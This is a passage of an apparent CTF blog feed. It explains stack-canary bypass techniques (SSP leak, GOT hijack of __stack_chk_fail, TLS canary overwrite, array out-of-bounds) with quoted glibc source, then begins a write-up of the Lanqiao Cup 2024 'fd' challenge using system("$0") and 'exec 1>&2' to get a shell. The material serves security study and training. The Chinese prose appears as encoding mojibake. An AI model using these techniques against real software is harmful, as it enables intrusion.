directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdbool.h></span></span><span class="token keyword">extern</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>__libc_argv attribute_hidden<span class="token punctuation">;</span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function<span class="token function">__fortify_fail_abort</span> <span class="token punctuation">(</span><span class="token keyword">_Bool</span> need_backtrace<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">/* The loop is added only to keep gcc happy.  Don't pass down     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]     may point to the corrupted stack.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span>need_backtrace <span class="token operator">?</span> <span class="token punctuation">(</span>do_abort <span class="token operator">|</span> do_backtrace<span class="token punctuation">)</span> <span class="token operator">:</span> do_abort<span class="token punctuation">,</span>    <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>    msg<span class="token punctuation">,</span>    <span class="token punctuation">(</span>need_backtrace <span class="token operator">&amp;&amp;</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span>     <span class="token operator">?</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token string">"&lt;unknown>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function<span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">__fortify_fail_abort</span> <span class="token punctuation">(</span>true<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail_abort<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ä½†æ˜¯ï¼ŒUbuntu 22.04 ä½¿ç”¨çš„æ˜¯ Glibc 2.35ï¼Œåœ¨è¯¥ Glibc ç‰ˆæœ¬ä¸­ä¸å­˜åœ¨ <code>__libc_argv[0]</code> å‚æ•°äº†ï¼Œæºç å¦‚ä¸‹ï¼š</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// ./glibc-2.35/debug/stack_chk_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">strong_alias</span> <span class="token punctuation">(</span>__stack_chk_fail<span class="token punctuation">,</span> __stack_chk_fail_local<span class="token punctuation">)</span><span class="token comment">// ./glibc-2.35/debug/fortify_fail.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span>do_abort<span class="token punctuation">,</span> <span class="token string">"*** %s ***: terminated\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">libc_hidden_def</span> <span class="token punctuation">(</span>__fortify_fail<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><em>å› æ­¤å¦‚æœæƒ³åœ¨ Ubuntu 22.04 æˆ–è¾ƒæ–°ç‰ˆæœ¬ Glibc çš„æœºå™¨ä¸Šè¿›è¡Œæœ¬åœ°æµ‹è¯•ï¼Œéœ€è¦æ›´æ¢ Glibc ç‰ˆæœ¬ï¼Œå»ºè®® Glibc 2.25 ä»¥ä¸‹ç‰ˆæœ¬</em></p></blockquote><p>å¯¹äº <code>__libc_argv[0]</code> çš„åœ°å€ï¼Œåœ¨ GDB ä¸­å¯ä»¥ç›´æ¥æŸ¥çœ‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp12.png" alt="åä¸ºæ¯2023-ez_ssp12.png"></p><p>å¦å¤–ï¼Œè¿˜éœ€è¦äº†è§£ä¸€ä¸ªé‡è¦å‡½æ•° <code>environ</code></p><p><code>environ</code> å­˜åœ¨äº libc ä¸­ï¼Œæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå‚¨å­˜ç€ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡ï¼Œå› æ­¤ <code>environ</code> æ˜¯è¿æ¥ libc åœ°å€ä¸æ ˆåœ°å€çš„æ¡¥æ¢</p><p>ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡åœ¨ç¨‹åºçš„æ ˆä¸­é•¿è¿™æ ·ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023-ez_ssp15.png" alt="åä¸ºæ¯2023-ez_ssp15.png"></p><blockquote><p>é€šè¿‡ libc åç§»è®¡ç®—å¾—åˆ° <code>environ</code> çš„çœŸå®åœ°å€åï¼Œæ³„éœ² <code>environ</code> çš„çœŸå®åœ°å€å¤„å­˜æ”¾çš„å€¼ï¼Œå°±å¯ä»¥å¾—åˆ°ä¿å­˜åœ¨æ ˆä¸­çš„ç¯å¢ƒå˜é‡çš„çœŸå®åœ°å€</p><p>é€šè¿‡ç¯å¢ƒå˜é‡çš„é¦–åœ°å€ä¸æ ˆä¸Šå…¶ä»–ä½ç½®çš„åç§»ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°æ ˆä¸Šä»»æ„å˜é‡çš„åœ°å€</p><p><em>é…åˆ SSP Leakï¼Œè™½ç„¶æˆ‘ä»¬ä¸èƒ½ç›´æ¥è·å¾— shellï¼Œä½†æ˜¯å¯ä»¥å®ç°æ ˆä¸Šçš„ä»»æ„åœ°å€è¯»</em></p></blockquote><p>å…·ä½“ä¾‹é¢˜è§æœ¬ç«™çš„ã€Š<a href="%E3%80%90%E5%8D%8E%E4%B8%BA%E6%9D%AF%202023%E3%80%91ez_ssp.md">ã€åä¸ºæ¯ 2023ã€‘ez_ssp</a>ã€‹</p><hr><h2 id="åŠ«æŒ-stack-chk-fail-ç»•è¿‡-Canary"><a href="#åŠ«æŒ-stack-chk-fail-ç»•è¿‡-Canary" class="headerlink" title="åŠ«æŒ __stack_chk_fail ç»•è¿‡ Canary"></a>åŠ«æŒ <code>__stack_chk_fail</code> ç»•è¿‡ Canary</h2><blockquote><p>Canary çš„æœºåˆ¶å°±æ˜¯æ£€æµ‹åˆ°æº¢å‡ºåæ‰§è¡Œ <code>__stack_chk_fail</code> å‡½æ•°æ˜¯ç¨‹åºå´©æºƒï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬å¯ä»¥åŠ«æŒ <code>__stack_chk_fail</code> å‡½æ•°ï¼Œä¾‹å¦‚å°† <code>__stack_chk_fail</code> å‡½æ•°çš„ GOT è¡¨åœ°å€æ”¹ä¸ºåé—¨å‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆè§¦å‘ Canary åå°±ä¼šæ‰§è¡Œåé—¨å‡½æ•°äº†</p><p>ä½¿ç”¨æ¡ä»¶ï¼š<br><mark>éœ€è¦å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</mark></p></blockquote><p>å…·ä½“ä¾‹é¢˜è§æœ¬ç«™çš„ã€Š<a href="%E3%80%90BJDCTF%202nd%E3%80%91r2t4.md">ã€BJDCTF 2ndã€‘r2t4</a>ã€‹</p><hr><h2 id="ä¿®æ”¹-TLS-ç»“æ„ä½“æ§åˆ¶-Canary"><a href="#ä¿®æ”¹-TLS-ç»“æ„ä½“æ§åˆ¶-Canary" class="headerlink" title="ä¿®æ”¹ TLS ç»“æ„ä½“æ§åˆ¶ Canary"></a>ä¿®æ”¹ TLS ç»“æ„ä½“æ§åˆ¶ Canary</h2><blockquote><p>TLS å…¨ç§°ä¸º Thread Local Storageï¼Œæ˜¯ä¸€ç§çº¿ç¨‹ç§æœ‰çš„æ•°æ®å­˜å‚¨æ–¹å¼ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„å±€éƒ¨å­˜å‚¨ç©ºé—´ï¼Œå¯ä»¥åœ¨å…¶ä¸­å­˜å‚¨çº¿ç¨‹ç§æœ‰çš„æ•°æ®</p><p>å› ä¸º Canary ä¼šè¢«å‚¨å­˜åœ¨ TLS ä¸­ï¼Œåœ¨å‡½æ•°è¿”å›å‰ä¼šä½¿ç”¨è¿™ä¸ªå€¼è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœæº¢å‡ºçš„é•¿åº¦è¶³å¤Ÿå¤§ï¼Œå¯ä»¥åŒæ—¶è¦†ç›–æ ˆä¸Šå‚¨å­˜çš„ Canary å’Œ TLS å‚¨å­˜çš„ Canary å®ç°ç»•è¿‡</p><p>ä½¿ç”¨æ¡ä»¶ï¼š<br><mark>1. æº¢å‡ºå­—èŠ‚å¤Ÿå¤§ï¼Œé€šå¸¸è‡³å°‘ä¸€ä¸ª pageï¼ˆ4Kï¼‰</mark><br><mark>2. åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œåœ¨çº¿ç¨‹å†…æ ˆæº¢å‡º</mark></p></blockquote><p>åœ¨ 64 ä½ç¨‹åºä¸­ï¼ŒTLS ç”±Â FS å¯„å­˜å™¨æŒ‡å‘ï¼Œé€šå¸¸ä¸º <code>FS:28h</code></p><p>åœ¨ 32 ä½ç¨‹åºä¸­ï¼ŒTLS ç”± GS å¯„å­˜å™¨æŒ‡å‘ï¼Œé€šå¸¸ä¸º <code>GS:14h</code></p><p>TLS åœ¨Â Glibc ä¸­çš„å®ç°ä¸ºÂ <code>tcbhead_t(TCB)</code> ç»“æ„ä½“ï¼Œå…¶ä¸­ <code>stack_guard</code> å˜é‡å­˜å‚¨çš„å€¼å°±æ˜¯ Canaryï¼Œå…¶ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>                <span class="token comment">/* Pointer to the TCB.  Not necessarily the                           thread descriptor used by libpthread.  */</span>  <span class="token class-name">dtv_t</span> <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>                <span class="token comment">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  <span class="token keyword">int</span> gscope_flag<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> sysinfo<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> stack_guard<span class="token punctuation">;</span>    <span class="token comment">// å‚¨å­˜ Canary çš„å€¼</span>  <span class="token class-name">uintptr_t</span> pointer_guard<span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">int</span> vgetcpu_cache<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/* Bit 0: X86_FEATURE_1_IBT.     Bit 1: X86_FEATURE_1_SHSTK.   */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> feature_1<span class="token punctuation">;</span>  <span class="token keyword">int</span> __glibc_unused1<span class="token punctuation">;</span>  <span class="token comment">/* Reservation of some values for the TM ABI.  */</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__private_tm<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">/* GCC split stack support.  */</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__private_ss<span class="token punctuation">;</span>  <span class="token comment">/* The lowest address of shadow stack,  */</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> ssp_base<span class="token punctuation">;</span>  <span class="token comment">/* Must be kept even if it is no longer used by glibc since programs,     like AddressSanitizer, depend on the size of tcbhead_t.  */</span>  __128bits __glibc_unused2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span> <span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>__padding<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token class-name">tcbhead_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”Ÿæˆéšæœºæ•° Canary çš„ä½ç½®ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">uintptr_t</span> stack_chk_guard <span class="token operator">=</span> <span class="token function">_dl_setup_stack_chk_guard</span><span class="token punctuation">(</span>_dl_random<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å½“ç¨‹åºåˆ›å»ºçº¿ç¨‹çš„æ—¶å€™ï¼Œä¼šé¡ºä¾¿åˆ›å»ºä¸€ä¸ª TLS ç”¨æ¥å­˜å‚¨çº¿ç¨‹ç§æœ‰çš„æ•°æ®ï¼Œè¯¥ TLS ä¹Ÿä¼šå­˜å‚¨ Canary çš„å€¼ï¼Œè€Œ TLS ä¼šä¿å­˜åœ¨æ ˆçš„é«˜åœ°å€å¤„Â <strong>ï¼ˆè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¯´åŒä¸€ä¸ªè¿›ç¨‹ä¸­çš„ä¸åŒçº¿ç¨‹çš„ Canary æ˜¯ç›¸åŒçš„ï¼‰</strong></p></blockquote><p>å› æ­¤ï¼Œæˆ‘ä»¬åªè¦è¦†ç›– TLS ä¸­ Canary çš„å€¼ï¼Œé‚£ä¹ˆæ•´ä¸ªç¨‹åºçš„ Canary çš„å€¼å°±æ˜¯ç”±æˆ‘ä»¬æ¥å®šçš„äº†</p><p>åœ¨å­çº¿ç¨‹ä¸­å¯ä»¥é€šè¿‡å¦‚ä¸‹æŒ‡ä»¤æŸ¥çœ‹ TLS åœ¨æ ˆä¸Šçš„é¦–åœ°å€ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/x pthread_self<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack10.png" alt="ã€starctf2018ã€‘babystack10.png"></p><blockquote><p>åœ¨ 64 ä½ç¨‹åºä¸­ï¼ŒCanary ä¸ TLS é¦–åœ°å€åç§» 28h</p><p>åœ¨ 32 ä½ç¨‹åºä¸­ï¼ŒCanary ä¸ TLS é¦–åœ°å€åç§» 14h</p></blockquote><p>å…·ä½“ä¾‹é¢˜è§æœ¬ç«™çš„ã€Š<a href="%E3%80%90Star%20Ctf%202018%E3%80%91babystack.md">ã€Star Ctf 2018ã€‘babystack</a>ã€‹</p><hr><h2 id="æ•°ç»„ä¸‹æ ‡è¶Šç•Œç»•è¿‡-Canary"><a href="#æ•°ç»„ä¸‹æ ‡è¶Šç•Œç»•è¿‡-Canary" class="headerlink" title="æ•°ç»„ä¸‹æ ‡è¶Šç•Œç»•è¿‡ Canary"></a>æ•°ç»„ä¸‹æ ‡è¶Šç•Œç»•è¿‡ Canary</h2><blockquote><p>å½“ç¨‹åºä¸­å­˜åœ¨æ•°ç»„ï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹æ•°ç»„çš„è¾¹ç•Œè¿›è¡Œæ£€æŸ¥æ—¶ï¼Œå¯ä»¥é€šè¿‡ä½¿æ•°ç»„çš„ä¸‹æ ‡è¶Šç•Œæ¥ç›´æ¥ä¿®æ”¹è¿”å›åœ°å€ï¼Œä»è€Œç»•è¿‡ Canary</p><p>ä½¿ç”¨æ¡ä»¶ï¼š<br><mark>ç¨‹åºçš„æ ˆä¸­å­˜åœ¨æ•°ç»„</mark></p></blockquote><p>å‡è®¾æ ˆä¸­çš„ç»“æ„å¦‚ä¸‹å›¾ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90starctf2018%E3%80%91babystack15.png" alt="ã€starctf2018ã€‘babystack15.png"></p><p>å…¶ä¸­ <code>arr[]</code> æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º 4 çš„æ•°ç»„ï¼Œæ­£å¸¸æ¥è¯´ï¼Œæ•°ç»„å…ƒç´ åªæœ‰ <code>arr[0] ~ arr[3]</code></p><p>ç”±äºæ•°ç»„æœ¬èº«ä¹Ÿæ˜¯åˆ©ç”¨æŒ‡é’ˆå¯»å€çš„ï¼Œä¾‹å¦‚ <code>uint_32</code> å‹çš„æ•°ç»„ <code>a[]</code> ä¸­ï¼Œ<code>a[i]</code> ä¸ <code>*(a + i * 4)</code> æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„</p><p>å› æ­¤å¦‚æœæ²¡æœ‰å¯¹æ•°ç»„çš„è¾¹ç•Œè¿›è¡Œæ£€æŸ¥ï¼Œé‚£ä¹ˆä¸Šå›¾ä¸­çš„ <code>arry[7]</code> å°±ä»£è¡¨æ ˆä¸Šçš„è¿”å›åœ°å€äº†ï¼Œå³ä½¿ <code>arry[7]</code> åœ¨æ•°ç»„ <code>arry[]</code> ä¸­ä¸‹æ ‡è¶Šç•Œ</p><p>å…·ä½“ä¾‹é¢˜è§æœ¬ç«™çš„ã€Š<a href="%E3%80%90wustctf%202020%E3%80%91name_your_cat.md">ã€wustctf 2020ã€‘name_your_cat</a>ã€‹</p><hr><h2 id="C-å¼‚å¸¸æœºåˆ¶ç»•è¿‡-Canary"><a href="#C-å¼‚å¸¸æœºåˆ¶ç»•è¿‡-Canary" class="headerlink" title="C++ å¼‚å¸¸æœºåˆ¶ç»•è¿‡ Canary"></a>C++ å¼‚å¸¸æœºåˆ¶ç»•è¿‡ Canary</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/89855%E3%80%91">Shanghai-DCTF-2017 çº¿ä¸‹æ”»é˜²Pwné¢˜ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å°</a></p>]]></content>
    
    
    <summary type="html">ä¸»è¦ä»‹ç»é‡Œä¸€äº›å¦‚ä½• Bypass ä¸€äº›å¸¸è§å®‰å…¨æœºåˆ¶çš„æ–¹æ³•ï¼Œä¾‹å¦‚ç»•è¿‡ Canaryã€PIE ç­‰ç­‰</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Bypass" scheme="https://www.uf4te.cn/tags/Bypass/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>ã€è“æ¡¥æ¯ 2024ã€‘fd</title>
    <link href="https://www.uf4te.cn/posts/7895a21b.html"/>
    <id>https://www.uf4te.cn/posts/7895a21b.html</id>
    <published>2024-05-11T12:52:14.000Z</published>
    <updated>2024-06-05T06:36:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ”¶è·"><a href="#æ”¶è·" class="headerlink" title="æ”¶è·"></a>æ”¶è·</h1><ul><li><p>åˆ©ç”¨ <code>system(&quot;$0&quot;)</code> è¿™ç§ä¸å¸¸è§çš„æ–¹å¼è·å– shell</p></li><li><p>åˆ©ç”¨ <code>exec 1&gt;&amp;2</code> é‡å®šå‘ç»•è¿‡ <code>close(1)</code></p></li></ul><hr><p><a href="https://match.ichunqiu.com/without">ï¼ˆ2024å¹´4æœˆ27æ—¥ï¼‰ã€è“æ¡¥æ¯2024ã€‘fd</a></p><hr><h1 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h1><p>åˆ†æç¨‹åºä¿æŠ¤ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd1.png" alt="PWN-è“æ¡¥æ¯2024_fd1.png"></p><p>IDA ä¸‹åˆ†æï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd2.png" alt="PWN-è“æ¡¥æ¯2024_fd2.png"></p><p>ç¨‹åºé€»è¾‘æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œé¦–å…ˆå‘ <code>info</code> æ‰€åœ¨åœ°å€è¾“å…¥ 0xE çš„é•¿åº¦</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd5.png" alt="PWN-è“æ¡¥æ¯2024_fd5.png"></p><p><code>info</code> ä½äº BSS æ®µä¸Š</p><p>ç„¶å <code>buf</code> å¤„å­˜åœ¨æ˜æ˜¾æº¢å‡ºï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd6.png" alt="PWN-è“æ¡¥æ¯2024_fd6.png"></p><p>å¹¶ä¸”ç¨‹åºä¸­å­˜åœ¨ <code>system()</code> å‡½æ•°ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd7.png" alt="PWN-è“æ¡¥æ¯2024_fd7.png"></p><p>ä½†æ²¡æœ‰ <code>&quot;/bin/sh&quot;</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd8.png" alt="PWN-è“æ¡¥æ¯2024_fd8.png"></p><p>å› æ­¤ï¼Œå¾ˆè‡ªç„¶åœ°æƒ³åˆ°é€šè¿‡ <code>info</code> å¾€ BSS æ®µå†™å…¥ <code>&quot;/bin/sh&quot;</code> ç„¶åæº¢å‡º <code>buf</code> æ„é€  <code>system(&quot;/bin/sh&quot;)</code></p><p>ä½†å¦‚æœçœŸæ˜¯è¿™æ ·ï¼Œå°±æ²¡å¿…è¦æœ‰è¿™ç¯‡æ–‡ç« äº†å“ˆå“ˆå“ˆ</p><p>å› ä¸ºå‘ç°åœ¨è¾“å…¥ <code>buf</code> åä¼šæ‰§è¡Œä¸€ä¸ª <code>check()</code> å‡½æ•°</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd3.png" alt="PWN-è“æ¡¥æ¯2024_fd3.png"></p><p>è¿™é‡Œä¼šæ£€æµ‹æˆ‘ä»¬è¾“å…¥åˆ° <code>info</code> å¤„çš„æ•°æ®ï¼Œä¸èƒ½åŒ…å« <code>&#39;b&#39;</code>ã€<code>&#39;i&#39;</code>ã€<code>&#39;n&#39;</code>ã€<code>&#39;/&#39;</code>ã€<code>&#39;s&#39;</code></p><p>åŒæ—¶ä¹Ÿä¸èƒ½å­˜åœ¨è¿ç»­ä¸‰ä¸ªå­—ç¬¦ä¸º <code>&quot;cat&quot;</code></p><p>å› æ­¤ï¼Œæˆ‘ä»¬æ„é€  <code>system(&quot;/bin/sh&quot;)</code>ã€<code>system(&quot;sh&quot;)</code>ã€<code>system(&quot;cat flag&quot;)</code> éƒ½æ˜¯è¡Œä¸é€šçš„</p><p>æ‰€ä»¥è¿™é‡Œè¦ç”¨åˆ°ä¸€ä¸ªæ¯”è¾ƒå°‘è§çš„è·å– shell çš„æ–¹å¼ï¼š<code>system(&quot;$0&quot;)</code></p><blockquote><p><code>$0</code> æ˜¯ Linux shell ä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼ŒæŒ‡çš„æ˜¯ shell æœ¬èº«çš„æ–‡ä»¶åï¼Œå› æ­¤ <code>system(&quot;$0&quot;)</code> çš„åŠŸèƒ½ç­‰ä»·äº <code>system(&quot;/bin/sh&quot;)</code></p><p>å¦å¤–ï¼Œè¿˜æœ‰ <code>$1</code> å’Œ <code>$2</code> ç­‰ï¼š</p><p><code>$1</code> æ˜¯ä¼ é€’ç»™è¯¥ shell è„šæœ¬çš„ç¬¬ä¸€ä¸ªå‚æ•°</p><p><code>$2</code> æ˜¯ä¼ é€’ç»™è¯¥ shell è„šæœ¬çš„ç¬¬äºŒä¸ªå‚æ•°</p></blockquote><p>ä½†è¿™æ ·ä¹Ÿè¿˜æ²¡æœ‰ç»“æŸï¼Œå› ä¸ºå³ä½¿æˆ‘ä»¬ç»•è¿‡äº†æ£€æµ‹ï¼Œè¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯ <code>close(1)</code></p><p>å…ˆæ¥çœ‹çœ‹ <code>close()</code> æ˜¯ä¸ªä»€ä¹ˆå‡½æ•°ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd4.png" alt="PWN-è“æ¡¥æ¯2024_fd4.png"></p><p>è¿™é‡Œçš„ <code>fd</code> æ˜æ˜¾æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œä¹Ÿå°±æ˜¯å…³é—­äº†æ–‡ä»¶æè¿°ç¬¦ 1 çš„åŠŸèƒ½</p><blockquote><p>Linux ä¸‹çš„ä¸‰ç§æ–‡ä»¶æè¿°ç¬¦ï¼š</p><p><code>fd = 0</code>ï¼šæ ‡å‡†è¾“å…¥æ–‡ä»¶ <code>stdin</code><br><code>fd = 1</code>ï¼šæ ‡å‡†è¾“å‡ºæ–‡ä»¶ <code>stdout</code><br><code>fd = 2</code>ï¼šæ ‡å‡†é”™è¯¯è¾“å‡ºæ–‡ä»¶ <code>stderr</code></p></blockquote><p>å› æ­¤è¿™é‡Œæ˜¯å…³é—­äº†æ ‡å‡†è¾“å‡ºçš„åŠŸèƒ½</p><p>åœ¨è·å– shell åçš„è¡¨ç°æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN-%E8%93%9D%E6%A1%A5%E6%9D%AF2024_fd9.png" alt="PWN-è“æ¡¥æ¯2024_fd9.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å·²ç»é€šè¿‡æ„é€  